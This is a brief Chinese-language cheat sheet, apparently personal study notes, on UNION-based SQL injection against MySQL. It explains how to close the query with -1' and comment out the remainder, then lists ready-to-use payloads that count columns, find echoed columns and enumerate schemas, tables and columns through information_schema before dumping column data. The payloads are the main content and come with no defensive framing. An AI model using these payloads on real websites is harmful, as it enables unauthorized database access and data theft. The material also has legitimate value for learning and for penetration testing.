### 											Summary SQLInjection Attack

SQL注入漏洞一般的格式为

```mysql
-1' payload-- ;
```

用于回显该查询语句的某些特定列的情况。

而

```mysql
-1';payload-- ;
```

用于能够回显所有查询结果的情况。

其中, -1’用于闭合第一句查询, 后边的payload执行你想要的查询语句。注释符负责绕过后边的条件检查。

现在给出一些常用的注入语句。

```mysql
-1' ORDER BY n-- ; 
#用于判断查询的列数
-1' or 1=1-- ;
#用于显示TABLE中所有查询列的结果
-1' UNION SELECT 1,2,3-- ;
#用于查看哪些列会回显
-1' UNION SELECT 1,2,group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA-- ;

-1' UNION SELECT 1,2,group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA='[TABLE_NAME]'-- ;


-1' UNION SELECT 1,2,group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_NAME='[TABLE_NAME]'-- ;

-1' UNION SELECT 1,[COLUMN_NAME1], [COLUMN_NAME2] FROM '[TABLE_NAME]'-- ; 

```

